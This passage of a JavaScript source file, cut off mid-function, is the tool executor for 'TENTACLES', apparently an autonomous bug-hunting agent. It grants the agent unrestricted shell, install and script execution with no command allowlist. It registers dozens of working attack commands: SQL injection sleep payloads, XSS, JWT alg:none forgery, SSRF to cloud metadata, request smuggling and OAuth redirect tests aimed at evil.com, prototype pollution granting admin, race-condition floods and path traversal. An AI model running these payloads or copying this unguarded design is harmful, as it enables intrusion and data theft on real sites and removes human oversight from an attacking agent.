'use strict';

// ── URL normalization helper — prevents silent curl failures on bare hostnames
function normalizeTargetUrl(target, defaultScheme = 'https') {
  if (!target) return target;
  if (typeof target !== 'string') return target;
  // Already has scheme
  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(target)) return target;
  // file://, mailto:, etc — leave alone for special protocols
  if (/^(mailto|tel|javascript|data):/i.test(target)) return target;
  // IP literal
  if (/^\d+\.\d+\.\d+\.\d+/.test(target)) return defaultScheme + '://' + target;
  // hostname with optional port and path
  if (/^[a-z0-9.\-]+(:\d+)?(\/.*)?$/i.test(target)) return defaultScheme + '://' + target;
  // localhost variants
  if (/^localhost(:\d+)?(\/.*)?$/i.test(target)) return defaultScheme + '://' + target;
  return target;
}

/**
 * TENTACLES — Unrestricted Tool Executor
 *
 * The agent has full shell access to accomplish whatever is needed to find,
 * exploit, and confirm vulnerabilities. No tool allowlist. No blocked commands.
 *
 * The agent can:
 *   - Run any bash/python/go command
 *   - Install any tool from apt, pip, go, cargo, npm, or GitHub
 *   - Write and execute custom exploit scripts
 *   - Chain tools in sequences
 *   - Use any installed tool on the VPS
 *
 * Safety is context-level (target scope, authorized programs) not command-level.
 *
 * Three execution modes:
 *   shell    — run a single bash command or pipeline
 *   script   — write a script file and execute it
 *   install  — install a tool (apt/pip/go/github/curl)
 */

const { spawn }     = require('child_process');
const path          = require('path');
const fs            = require('fs-extra');
const { v4: uuidv4 } = require('uuid');
const logger        = require('../logger');
const broadcaster   = require('../api/broadcaster');

const WORKSPACE   = process.env.WORKSPACE_DIR || '/tmp/tentacles/workspace';
const SCRIPTS_DIR = process.env.SCRIPTS_DIR   || '/tmp/tentacles/scripts';

// Default timeouts by mode (ms)
const TIMEOUTS = {
  shell:   parseInt(process.env.TIMEOUT_SHELL   || '120000'),   // 2 min
  script:  parseInt(process.env.TIMEOUT_SCRIPT  || '180000'),   // 3 min
  install: parseInt(process.env.TIMEOUT_INSTALL || '300000'),   // 5 min
  scan:    parseInt(process.env.TIMEOUT_SCAN    || '600000'),   // 10 min (nuclei/nmap)
  default: parseInt(process.env.TIMEOUT_DEFAULT || '120000'),
};

// PATH that covers all common tool locations on the VPS
const VPS_PATH = [
  '/usr/local/sbin', '/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin',
  '/root/go/bin', '/root/.cargo/bin', '/root/.local/bin',
  '/snap/bin', '/home/ubuntu/go/bin', '/home/ubuntu/.local/bin',
  process.env.PATH || '',
].join(':');

// ── HTTP response cache (30-second TTL, GET only, max 200 entries) ──────────
const _httpCache = new Map(); // key → {output, ts, size}
const HTTP_CACHE_TTL = 30000; // 30 seconds
const HTTP_CACHE_MAX = 200;

function getCached(url, method) {
  if (method && method !== 'GET') return null;
  const entry = _httpCache.get(url);
  if (!entry) return null;
  if (Date.now() - entry.ts > HTTP_CACHE_TTL) { _httpCache.delete(url); return null; }
  return entry.output;
}

function setCached(url, method, output) {
  if (method && method !== 'GET') return;
  if (!output || output.length < 50) return;
  if (_httpCache.size >= HTTP_CACHE_MAX) {
    // Evict oldest entry
    const oldest = [..._httpCache.entries()].sort((a,b) => a[1].ts - b[1].ts)[0];
    if (oldest) _httpCache.delete(oldest[0]);
  }
  _httpCache.set(url, { output, ts: Date.now() });
}

// ── User-Agent pool — rotated per request ────────────────────────────────────
const UA_POOL = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
];
let _uaIdx = Math.floor(Math.random() * UA_POOL.length);
function getNextUA() { return UA_POOL[(_uaIdx++) % UA_POOL.length]; }

// Base environment for all tool runs
const BASE_ENV = {
  ...process.env,
  PATH:              VPS_PATH,
  HOME:              '/root',
  GOPATH:            process.env.GOPATH || '/root/go',
  GOROOT:            process.env.GOROOT || '/usr/local/go',
  DEBIAN_FRONTEND:   'noninteractive',
  TERM:              'xterm',
  PYTHONUNBUFFERED:  '1',
};

fs.ensureDirSync(WORKSPACE);
fs.ensureDirSync(SCRIPTS_DIR);

// ─────────────────────────────────────────────────────────────────────────────
// TOOL REGISTRY
// These are pre-built entries for common tools so the agent can reference them
// by name. The agent can also use shell/script/install for anything not listed.
// ─────────────────────────────────────────────────────────────────────────────

function shellTool(label, cat, buildCmd) {
  return { 
    label, category: cat, 
    buildCommand: (params) => {
      // Auto-normalize target URL before tool sees it
      const normalized = (params && params.target)
        ? { ...params, target: normalizeTargetUrl(params.target) }
        : params;
      return buildCmd(normalized);
    }
  };
}

const APPROVED_TOOLS = {
  // ── Recon ──────────────────────────────────────────────────────────────────
  whois:        shellTool('WHOIS', 'recon', ({target}) => ['whois', target]),
  dig_any:      shellTool('DNS ANY', 'recon', ({target}) => ['dig', 'ANY', target, '+noall', '+answer']),
  dig_axfr:     shellTool('Zone Transfer', 'recon', ({target, nameserver}) => ['dig', 'AXFR', target, `@${nameserver||'ns1.'+target}`]),
  nmap_quick:   shellTool('Nmap Quick', 'recon', ({target}) => ['nmap', '-T4', '--open', '-F', target]),
  nmap_service: shellTool('Nmap Service', 'recon', ({target, ports}) => ['nmap', '-sV', '-T4', '-p', ports||'80,443,8080,8443,3000,4000,4443,8000,9000', target]),
  nmap_vuln:    shellTool('Nmap Vuln', 'recon', ({target}) => ['nmap', '--script=vuln', '-T4', '-F', target]),
  subfinder:    shellTool('Subfinder', 'recon', ({target}) => ['subfinder', '-d', target, '-silent', '-all']),
  httpx_probe:  shellTool('HTTPX Probe', 'recon', ({target}) => ['httpx', '-u', target, '-title', '-status-code', '-tech-detect', '-silent']),
  katana_crawl: shellTool('Katana Crawl', 'recon', ({target, depth}) => ['katana', '-u', target, '-d', String(depth||3), '-silent', '-jc', '-ef', 'css,png,jpg,gif,svg,ico,woff,woff2']),
  waybackurls:  shellTool('Wayback URLs', 'recon', ({target}) => ['bash', '-c', `echo "${target}" | waybackurls`]),
  gau:          shellTool('GAU', 'recon', ({target}) => ['gau', '--threads', '5', target]),
  whatweb:      shellTool('WhatWeb', 'recon', ({target}) => ['whatweb', '--color=never', '-q', target]),

  // ── Fuzzing & scanning ────────────────────────────────────────────────────
  ffuf_dirs:    shellTool('FFUF Dirs', 'fuzz', ({target, wordlist}) => [
    'ffuf', '-u', `${target}/FUZZ`, '-w', wordlist||'/root/SecLists/Discovery/Web-Content/common.txt',
    '-mc', '200,201,202,204,301,302,307,403', '-t', '50', '-silent'
  ]),
  ffuf_params:  shellTool('FFUF Params', 'fuzz', ({target, wordlist}) => [
    'ffuf', '-u', `${target}?FUZZ=test`, '-w', wordlist||'/root/SecLists/Discovery/Web-Content/burp-parameter-names.txt',
    '-mc', '200,201,301,302', '-t', '30', '-silent'
  ]),
  nuclei_scan:  shellTool('Nuclei', 'scan', ({target, templates, cookie_header, headers}) => {
    const args = ['nuclei', '-u', target, '-t', templates||'/root/nuclei-templates/',
      '-severity', 'medium,high,critical', '-silent', '-no-color', '-timeout', '10', '-bulk-size', '10'];
    if (cookie_header) args.push('-H', `Cookie: ${cookie_header}`);
    if (Array.isArray(headers)) headers.forEach(h => args.push('-H', h));
    return args;
  }),
  gobuster:     shellTool('Gobuster', 'fuzz', ({target, wordlist}) => [
    'gobuster', 'dir', '-u', target, '-w', wordlist||'/root/SecLists/Discovery/Web-Content/common.txt',
    '-q', '--no-error', '-t', '30'
  ]),
  arjun:        shellTool('Arjun Param Discover', 'fuzz', ({target}) => ['arjun', '-u', target, '--stable']),

  // ── Exploitation ──────────────────────────────────────────────────────────
  sqlmap_test:  shellTool('SQLMap', 'exploit', ({target, param, level, risk}) => [
    'sqlmap', '-u', target, '--batch', '--random-agent',
    ...(param ? ['-p', param] : []),
    '--level', String(level||1), '--risk', String(risk||1),
    '--output-dir', '/tmp/tentacles/sqlmap'
  ]),
  dalfox:       shellTool('Dalfox XSS', 'exploit', ({target}) => ['dalfox', 'url', target, '--silence']),
  dalfox_scan:  shellTool('Dalfox XSS scan', 'exploit', ({target}) => ['dalfox', 'url', target, '--silence']),

  // ── HTTP exploit helpers ───────────────────────────────────────────────────
  curl_headers: shellTool('HTTP Headers', 'recon', ({target}) => [
    'curl', '-sI', '--max-time', '10', '-L', '--user-agent', 'Mozilla/5.0', target
  ]),
  curl_body: shellTool('HTTP Body', 'recon', ({target, method, headers, data, cookie_header}) => {
    const args = ['curl', '-s', '--max-time', '15', '-L', '-X', method||'GET',
      '-D', '-', '--compressed'];
    for (const h of (headers||[])) args.push('-H', h);
    if (cookie_header) args.push('-H', `Cookie: ${cookie_header}`);
    if (data) args.push('-d', data);
    args.push(target);
    return args;
  }),
  curl_exploit: shellTool('HTTP Exploit', 'exploit', ({target, method, headers, data, followRedirects, cookie_header}) => {
    const args = ['curl', '-s', '--max-time', '20', '-X', method||'POST',
      '-D', '-', '--compressed'];
    if (followRedirects !== false) args.push('-L');
    for (const h of (headers||[])) args.push('-H', h);
    if (cookie_header) args.push('-H', `Cookie: ${cookie_header}`);
    if (data) args.push('-d', data);
    args.push(target);
    return args;
  }),

  // ── FULL SHELL ACCESS ─────────────────────────────────────────────────────
  // These three tools give the agent unrestricted execution capability.
  // Use these for anything not covered by the specific tools above.

  shell:        { label: 'Shell Command',    category: 'shell',   isShell:   true },
  bash_command: { label: 'Bash Command',     category: 'shell',   isShell:   true },
  script:       { label: 'Write & Run',      category: 'shell',   isScript:  true },
  write_script: { label: 'Write Script',     category: 'shell',   isFileOp:  true },
  write_and_run:{ label: 'Write & Run',      category: 'shell',   isScript:  true },
  install_tool: { label: 'Install Tool',     category: 'install', isInstall: true },
  python_run:   { label: 'Run Python',       category: 'shell',   isPython:  true },

  // ── VPS ops ───────────────────────────────────────────────────────────────
  list_vps_dir:  { label: 'List Directory', category: 'recon', isVpsOp: true },
  read_vps_file: { label: 'Read File',      category: 'recon', isVpsOp: true },
  read_file:     { label: 'Read File',      category: 'recon', isVpsOp: true },
  exec_script:   { label: 'Exec Script',    category: 'shell', isScriptOp: true },
  run_user_script: { label: 'User Script',  category: 'recon', isUserScript: true },

  // Additional aliases used by older tool calls
  nmap_ports:   shellTool('Nmap Ports', 'recon', ({target}) => ['nmap', '-T4', '--open', '-F', target]),
  dnsx:         shellTool('DNSX', 'recon', ({target}) => ['dnsx', '-d', target, '-a', '-silent']),
  cors_test:    shellTool('CORS Test', 'recon', ({target}) => ['curl', '-sI', '-H', `Origin: https://evil.com`, target]),
  waf_detect:   shellTool('WAF Detect', 'recon', ({target}) => ['curl', '-s', '-A', 'Mozilla/5.0', '-o', '/dev/null', '-w', '%{http_code}', target]),
  jwt_analyze:  shellTool('JWT Analyze', 'exploit', ({token}) => ['bash', '-c', `echo '${(token||'').replace(/'/g,"'\\''")}'  | python3 -c "import sys,base64,json; p=sys.stdin.read().strip().split('.'); print(json.dumps(json.loads(base64.b64decode(p[1]+'==').decode()),indent=2))" 2>/dev/null || echo "invalid jwt"`]),
  ssrf_test:    shellTool('SSRF Test', 'exploit', ({target, ssrfParam}) => ['curl', '-s', '--max-time', '10', `${target}?${ssrfParam||'url'}=http://169.254.169.254/latest/meta-data/`]),
  crlf_test:    shellTool('CRLF Test', 'exploit', ({target}) => ['curl', '-sI', '--max-time', '10', `${target}/%0d%0aX-Injected: crlf`]),
  param_miner:  shellTool('Param Mine', 'fuzz', ({target}) => ['arjun', '-u', target, '--stable', '-oT', '/dev/stdout']),
  prototype_test: shellTool('Proto Pollution', 'exploit', ({target, method, data}) => ['curl', '-s', '--max-time', '15', '-X', method||'POST', '-H', 'Content-Type: application/json', '-d', data||'{"__proto__":{"isAdmin":true}}', target]),
  mass_assign_test: shellTool('Mass Assignment', 'exploit', ({target, data}) => ['curl', '-s', '--max-time', '15', '-X', 'PUT', '-H', 'Content-Type: application/json', '-d', data||'{"role":"admin","isAdmin":true}', target]),
  cache_poison_test: shellTool('Cache Poison', 'exploit', ({target}) => ['curl', '-sI', '--max-time', '10', '-H', 'X-Forwarded-Host: evil.com', '-H', 'X-Forwarded-For: 127.0.0.1', target]),
  oauth_test:   shellTool('OAuth Test', 'exploit', ({target, client_id, redirect_uri}) => ['curl', '-sI', '--max-time', '10', `${target}?client_id=${client_id||'test'}&redirect_uri=${encodeURIComponent(redirect_uri||'https://evil.com')}&response_type=code`]),
  takeover_check: shellTool('Takeover Check', 'recon', ({target}) => ['curl', '-sI', '--max-time', '10', '--resolve', `${target}:443:127.0.0.1`, `https://${target}`]),
  stored_xss_probe: shellTool('Stored XSS Probe', 'exploit', ({target}) => ['curl', '-s', '--max-time', '10', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', '{"name":"<img src=x onerror=alert(1)>","comment":"<script>alert(document.domain)</script>"}', target]),
  api_discover: shellTool('API Discover', 'recon', ({target}) => ['ffuf', '-u', `${target}/api/FUZZ`, '-w', '/root/SecLists/Discovery/Web-Content/api/api-endpoints.txt', '-mc', '200,201,204,301,302,400,401,403', '-t', '30', '-silent']),
  graphql_test: shellTool('GraphQL Test', 'exploit', ({target}) => ['curl', '-s', '--max-time', '15', '-X', 'POST', '-H', 'Content-Type: application/json', '-d', '{"query":"{__schema{types{name}}}"}', target]),
  race_test:    shellTool('Race Condition', 'exploit', ({target, method, data, count}) => ['bash', '-c', `for i in $(seq 1 ${count||10}); do curl -s -X ${method||'POST'} -d '${(data||'').replace(/'/g,"'\\''")}'  '${target}' & done; wait`]),
  smuggling_test: shellTool('HTTP Smuggling', 'exploit', ({target}) => ['curl', '-s', '--max-time', '15', '-X', 'POST', '-H', 'Content-Type: application/x-www-form-urlencoded', '-H', 'Transfer-Encoding: chunked', '--data-raw', '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n', target]),
  login_sequence: { label: 'Login Sequence', category: 'auth', isShell: true,
    buildShell: ({target, username, password, login_path}) =>
      `curl -s -c /tmp/tentacles_cookies.txt -X POST -H 'Content-Type: application/json' -d '{"username":"${username}","password":"${password}","email":"${username}"}' '${target}${login_path||'/api/login'}' 2>&1`
  },
  // ── JS endpoint/secret extraction ─────────────────────────────────────────
  js_analysis: shellTool('JS Endpoint Extractor', 'recon', ({target, cookie_header}) => {
    const args = ['python3', '/opt/tentacles/js_extract.py', target];
    if (cookie_header) args.push(cookie_header);
    return args;
  }),

    shodan_lookup: shellTool('Shodan', 'recon', ({query}) => ['bash', '-c', `curl -s "https://internetdb.shodan.io/${query}" 2>/dev/null || echo "shodan unavailable"`]),

  // ── METHOD ENUMERATION — try all HTTP verbs on an endpoint ──────────────
  method_enum: shellTool('Method Enumeration', 'exploit', ({target, cookie_header}) => {
    const cookieFlag = cookie_header ? `-H 'Cookie: ${cookie_header}'` : '';
    return ['bash', '-c',
      `for m in GET POST PUT PATCH DELETE OPTIONS HEAD; do ` +
      `code=$(curl -sk -X $m "${target}" ${cookieFlag} -o /dev/null -w "%{http_code}|%{size_download}" --max-time 8); ` +
      `echo "$m: $code"; ` +
      `done; ` +
      `echo "=== Method override headers ==="; ` +
      `for h in 'X-HTTP-Method-Override: DELETE' 'X-HTTP-Method: DELETE' 'X-Method-Override: DELETE'; do ` +
      `code=$(curl -sk -X POST "${target}" ${cookieFlag} -H "$h" -o /dev/null -w "%{http_code}" --max-time 8); ` +
      `echo "$h -> POST resulted in: $code"; ` +
      `done`
    ];
  }),

  // ── PARAM VALUE FUZZ — fuzz values of known parameters with common payloads ──
  param_fuzz: shellTool('Parameter Value Fuzz', 'exploit', ({target, param, cookie_header}) => {
    const cookieFlag = cookie_header ? `-H 'Cookie: ${cookie_header}'` : '';
    const p = param || 'id';
    return ['bash', '-c',
      `URL_BASE="${target}"`,
      `echo "=== Fuzzing param: ${p} ==="`,
      `for v in "1" "2" "../../etc/passwd" "' OR 1=1-- " "<script>alert(1)</script>" "{{7*7}}" "169.254.169.254" "admin" "../" "%2e%2e/" "true" "null" "[]" '{"$gt":""}'; do ` +
      `enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote_plus('$v'))" 2>/dev/null || echo "$v"); ` +
      `sep="?"; echo "$URL_BASE" | grep -q "?" && sep="&"; ` +
      `result=$(curl -sk "$URL_BASE${'$'}{sep}${p}=$enc" ${cookieFlag} --max-time 8 -o /dev/null -w "%{http_code}|%{size_download}"); ` +
      `echo "$v -> $result"; ` +
      `done`
    ];
  }),

  // ── BASELINE DIFF — compare baseline vs payload response side by side ──────
  baseline_diff: shellTool('Baseline Differential', 'exploit', ({target, payload_url, cookie_header}) => {
    const cookieFlag = cookie_header ? `-H 'Cookie: ${cookie_header}'` : '';
    return ['bash', '-c',
      `echo "=== Baseline ==="; ` +
      `B=$(curl -sk "${target}" ${cookieFlag} --max-time 10); ` +
      `BSIZE=$(echo "$B" | wc -c); BTIME=$({ time -p curl -sk "${target}" ${cookieFlag} --max-time 10 -o /dev/null; } 2>&1 | awk '/real/{print $2}'); ` +
      `echo "Baseline size: ${'$'}BSIZE bytes, time: ${'$'}BTIME s"; ` +
      `echo "$B" | head -20; ` +
      `echo "=== Payload ==="; ` +
      `P=$(curl -sk "${payload_url}" ${cookieFlag} --max-time 15); ` +
      `PSIZE=$(echo "$P" | wc -c); PTIME=$({ time -p curl -sk "${payload_url}" ${cookieFlag} --max-time 15 -o /dev/null; } 2>&1 | awk '/real/{print $2}'); ` +
      `echo "Payload size: ${'$'}PSIZE bytes, time: ${'$'}PTIME s"; ` +
      `echo "$P" | head -20; ` +
      `echo "=== Diff Summary ==="; ` +
      `echo "Size delta: $((PSIZE - BSIZE)) bytes"; ` +
      `echo "Time delta: $(echo "$PTIME - $BTIME" | bc 2>/dev/null || echo unknown) s"; ` +
      `diff <(echo "$B") <(echo "$P") | head -30`
    ];
  }),

  // ── TIME-BASED PROBE — measure baseline vs SLEEP() payload response time ────
  time_probe: shellTool('Time-Based Probe', 'exploit', ({target, param, cookie_header}) => {
    const cookieFlag = cookie_header ? `-H 'Cookie: ${cookie_header}'` : '';
    const p = param || 'id';
    return ['bash', '-c',
      `URL_BASE="${target}"`,
      `sep="?"; echo "$URL_BASE" | grep -q "?" && sep="&"; ` +
      `echo "=== Baseline timing ==="; ` +
      `B1=$({ time -p curl -sk "${'$'}URL_BASE${'$'}{sep}${p}=1" ${cookieFlag} --max-time 30 -o /dev/null; } 2>&1 | awk '/real/{print $2}'); ` +
      `echo "Baseline: ${'$'}B1 seconds"; ` +
      `for payload in "1' AND SLEEP(5)-- -" "1; SELECT pg_sleep(5)-- -" "1' WAITFOR DELAY '0:0:5'-- -"; do ` +
      `enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote_plus('$payload'))"); ` +
      `T=$({ time -p curl -sk "${'$'}URL_BASE${'$'}{sep}${p}=$enc" ${cookieFlag} --max-time 30 -o /dev/null; } 2>&1 | awk '/real/{print $2}'); ` +
      `echo "Payload [$payload] -> ${'$'}T s (delta: $(echo "${'$'}T - ${'$'}B1" | bc 2>/dev/null) s)"; ` +
      `done`
    ];
  }),

  // ── DECEPTICON tools (Decepticon by PurpleAILAB — ported techniques) ────────

  graphql_audit: shellTool('GraphQL Audit', 'exploit', ({target, cookie_header}) => {
    const auth = cookie_header ? `'Cookie: ${cookie_header}'` : '';
    const cookieFlag = cookie_header ? `-H 'Cookie: ${cookie_header}'` : '';
    return ['bash', '-c',
      `for p in /graphql /api/graphql /graphiql /v1/graphql /gql; do ` +
      `code=$(curl -sk -o /dev/null -w "%{http_code}" "${target}$p" -H 'Content-Type: application/json' ${cookieFlag} -d '{"query":"{ __typename }"}'); ` +
      `[ "$code" != "404" ] && [ "$code" != "000" ] && echo "FOUND $p HTTP $code"; ` +
      `done; ` +
      `echo "=== SCHEMA ==="; ` +
      `curl -sk "${target}/graphql" ${cookieFlag} -H 'Content-Type: application/json' -d '{"query":"{ __schema { types { name kind fields { name args { name type { name } } } } } }"}' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -60; ` +
      `echo "=== BATCH TEST ==="; ` +
      `curl -sk "${target}/graphql" ${cookieFlag} -H 'Content-Type: application/json' -d '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]' -o /dev/null -w "batch status: %{http_code}"`
    ];
  }),

  jwt_audit: shellTool('JWT Audit', 'exploit', ({target, cookie_header}) => {
    const cookieFlag = cookie_header ? `-H 'Cookie: ${cookie_header}'` : '';
    return ['bash', '-c',
      `echo "=== JWKS ==="; curl -sk "${target}/.well-known/jwks.json" | python3 -m json.tool 2>/dev/null | head -20; ` +
      `curl -sk "${target}/.well-known/openid-configuration" | python3 -m json.tool 2>/dev/null | head -20; ` +
      `echo "=== alg:none test ==="; ` +
      `HEADER=$(echo '{"alg":"none","typ":"JWT"}' | python3 -c "import sys,base64; d=sys.stdin.read().strip(); print(base64.urlsafe_b64encode(d.encode()).decode().rstrip('='))"); ` +
      `CLAIMS=$(echo '{"sub":"1","role":"admin","isAdmin":true}' | python3 -c "import sys,base64; d=sys.stdin.read().strip(); print(base64.urlsafe_b64encode(d.encode()).decode().rstrip('='))"); ` +
      `NONE_TOK="$HEADER.$CLAIMS."; ` +
      `curl -sk "${target}/api/admin" -H "Authorization: Bearer $NONE_TOK" ${cookieFlag} -w "alg:none -> HTTP %{http_code}" -o /dev/null; ` +
      `echo "=== Common weak secrets ==="; ` +
      `for s in secret password jwt hs256 token 123456 dev; do echo -n "secret=$s: "; curl -sk "${target}/api/admin" ${cookieFlag} -H "X-Debug-Secret: $s" -o /dev/null -w "%{http_code} "; done; echo`
    ];
  }),

  oauth_audit: shellTool('OAuth Audit', 'exploit', ({target, cookie_header}) => {
    const cookieFlag = cookie_header ? `-H 'Cookie: ${cookie_header}'` : '';
    return ['bash', '-c',
      `echo "=== OIDC config ==="; curl -sk "${target}/.well-known/openid-configuration" | python3 -m json.tool 2>/dev/null | grep -E '"(authorization|token|userinfo)_endpoint"' || echo none; ` +
      `echo "=== OAuth endpoints ==="; ` +
      `for p in /oauth/authorize /auth/oauth /login/oauth/authorize /connect/authorize /oauth2/auth; do ` +
      `code=$(curl -sk -o /dev/null -w "%{http_code}" "${target}$p" ${cookieFlag}); ` +
      `[ "$code" != "404" ] && [ "$code" != "000" ] && echo "FOUND $p HTTP $code"; ` +
      `done; ` +
      `echo "=== redirect_uri bypass test ==="; ` +
      `curl -sk "${target}/oauth/authorize?client_id=1&response_type=code&redirect_uri=https%3A%2F%2Fevil.com" ${cookieFlag} -D - | grep -i 'location:\|error:'; ` +
      `curl -sk "${target}/oauth/authorize?client_id=1&response_type=code&redirect_uri=${target}%2F..%2Fevil.com" ${cookieFlag} -D - | grep -i 'location:\|error:'`
    ];
  }),

  proto_pollution_test: shellTool('Prototype Pollution', 'exploit', ({target, endpoint, cookie_header}) => {
    const ep = endpoint || '/api';
    const cookieFlag = cookie_header ? `-H 'Cookie: ${cookie_header}'` : '';
    return ['bash', '-c',
      `echo "=== PP via JSON body ==="; ` +
      `curl -sk "${target}${ep}" -X POST -H 'Content-Type: application/json' ${cookieFlag} -d '{"__proto__":{"admin":true,"role":"admin","isAdmin":true}}' -w "\nHTTP: %{http_code}\n"; ` +
      `echo "=== PP via constructor ==="; ` +
      `curl -sk "${target}${ep}" -X POST -H 'Content-Type: application/json' ${cookieFlag} -d '{"constructor":{"prototype":{"admin":true}}}' -w "\nHTTP: %{http_code}\n"; ` +
      `echo "=== PP via query string ==="; ` +
      `curl -sk "${target}${ep}?__proto__[admin]=true&__proto__[role]=admin" ${cookieFlag} -w "\nHTTP: %{http_code}\n"; ` +
      `echo "=== Follow-up check (did pollution stick?) ==="; ` +
      `curl -sk "${target}${ep}" ${cookieFlag} | python3 -m json.tool 2>/dev/null | grep -i '"admin"\|"isAdmin"\|"role"' | head -5`
    ];
  }),

  idor_diff: shellTool('IDOR Differential', 'exploit', ({target, target2, cookie_header}) => {
    const cookieFlag = cookie_header ? `-H 'Cookie: ${cookie_header}'` : '';
    const t2 = target2 || target;
    return ['bash', '-c',
      `echo "=== Own resource ==="; ` +
      `R1=$(curl -sk "${target}" ${cookieFlag} | python3 -m json.tool 2>/dev/null || curl -sk "${target}" ${cookieFlag}); ` +
      `echo "$R1" | head -20; ` +
      `echo "=== Other user resource ==="; ` +
      `R2=$(curl -sk "${t2}" ${cookieFlag} | python3 -m json.tool 2>/dev/null || curl -sk "${t2}" ${cookieFlag}); ` +
      `echo "$R2" | head -20; ` +
      `echo "=== Diff ==="; ` +
      `diff <(echo "$R1") <(echo "$R2") | head -20; ` +
      `echo "Sizes: own=$(echo "$R1" | wc -c)b other=$(echo "$R2" | wc -c)b"`
    ];
  }),

  // ── SPINEL — Asiful's reflection scanner ──────────────────────────────────
  // Discovers reflected/echoed input surfaces across 5 injection points.
  // Deployed to VPS at /opt/tentacles/spinel_scanner/main.py
  spinel_reflection: {
    label: 'Spinel Reflection Scanner',
    category: 'exploit',
    isShell: true,
    buildShell: ({ target, targets_file, points, proxy, no_proxy, output_dir, verbose, max_runtime }) => {
      const spinelDir = '/opt/tentacles/spinel_scanner';
      const targetsPath = targets_file || `${spinelDir}/targets_tmp.txt`;
      const outDir = output_dir || `/tmp/tentacles/spinel_output/${Date.now()}`;
      const pointsArg = points ? `--points ${Array.isArray(points) ? points.join(' ') : points}` : '';
      const proxyArg = no_proxy ? '' : (proxy ? `--proxy ${proxy}` : '');
      const verboseArg = verbose ? '--verbose' : '';
      const runtimeArg = max_runtime ? `--max-runtime ${max_runtime}` : '--max-runtime 120';

      // Write target to temp file if needed, then run spinel
      const targetLine = target ? `echo "${target}" > ${targetsPath} &&` : '';
      return [
        'bash', '-c',
        `${targetLine} cd ${spinelDir} && python3 main.py --targets ${targetsPath} --output-dir ${outDir} --no-report ${pointsArg} ${proxyArg} ${verboseArg} ${runtimeArg} 2>&1 || echo "[SPINEL] Exited with error — check output above"`
      ];
    },
  },
  nuclei:       shellTool('Nuclei (alias)', 'scan', ({target, templates, cookie_header, headers}) => {
    const args = ['nuclei', '-u', target, '-t', templates||'/root/nuclei-templates/',
      '-severity', 'medium,high,critical', '-silent', '-no-color', '-timeout', '10'];
    if (cookie_header) args.push('-H', `Cookie: ${cookie_header}`);
    if (Array.isArray(headers)) headers.forEach(h => args.push('-H', h));
    return args;
  }),
};

// ─────────────────────────────────────────────────────────────────────────────
// DYNAMIC TOOL REGISTRATION
// Agent can register new tools at runtime after installing them
// ─────────────────────────────────────────────────────────────────────────────
function registerTool(id, label, buildCmd) {
  APPROVED_TOOLS[id] = { label, category: 'dynamic', buildCommand: buildCmd };
  logger.info('Dynamic tool registered', { id, label });
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN ENTRY POINT
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Public executeTool — forensically logged wrapper around _executeToolImpl.
 * Captures every tool call (input, output, duration, error) to disk.
 */
async function executeTool(sessionId, execId, toolId, params = {}) {
  const startedAt = Date.now();
  let result = null;
  let error = null;
  try {
    result = await _executeToolImpl(sessionId, execId, toolId, params);
  } catch (e) {
    error = e;
    throw e;
  } finally {
    // Forensic capture — never throws, never blocks
    try {
      const fl = require('../agent/forensicLogger');
      const durationMs = Date.now() - startedAt;
      const outputExcerpt = result?.output ? String(result.output).slice(0, 4000) : '';
      const outputSize = result?.output ? String(result.output).length : 0;
      fl.logTool(sessionId, execId, {
        toolId,
        params: JSON.stringify(params).slice(0, 2000),
        durationMs,
        success: !!(result && result.success !== false),
        error: error ? error.message : (result?.error || null),
        outputSize,
        outputExcerpt,
      });
    } catch {}
  }
  return result;
}

async function _executeToolImpl(sessionId, execId, toolId, params = {}) {
  // Unknown tools → try to run as a shell command using the toolId as the binary
  let toolDef = APPROVED_TOOLS[toolId];
  if (!toolDef) {
    // Auto-create a shell tool for unknown tool IDs
    // This lets the agent call any installed binary by name
    logger.info('Unknown tool — auto-running as shell command', { toolId });
    toolDef = { label: toolId, category: 'dynamic', buildCommand: (p) => {
      const args = [toolId];
      if (p.target) args.push(p.target);
      if (p.args) args.push(...(Array.isArray(p.args) ? p.args : [p.args]));
      return args;
    }};
  }

  const runId     = uuidv4().slice(0, 8);
  const workspace = path.join(WORKSPACE, sessionId, execId);
  fs.ensureDirSync(workspace);
  const outputFile = path.join(workspace, `${toolId}_${runId}.txt`);

  logger.info('Tool start', { sessionId, execId, toolId, runId, params: JSON.stringify(params).slice(0,200) });

  if (toolDef.isShell || toolId === 'bash_command' || toolId === 'shell')
    return _runShell(sessionId, execId, toolId, toolDef, params, workspace, outputFile, runId);
  if (toolDef.isScript || toolId === 'write_and_run' || toolId === 'script')
    return _runScript(sessionId, execId, toolId, params, workspace, outputFile, runId);
  if (toolDef.isPython || toolId === 'python_run')
    return _runPython(sessionId, execId, toolId, params, workspace, outputFile, runId);
  if (toolDef.isInstall || toolId === 'install_tool')
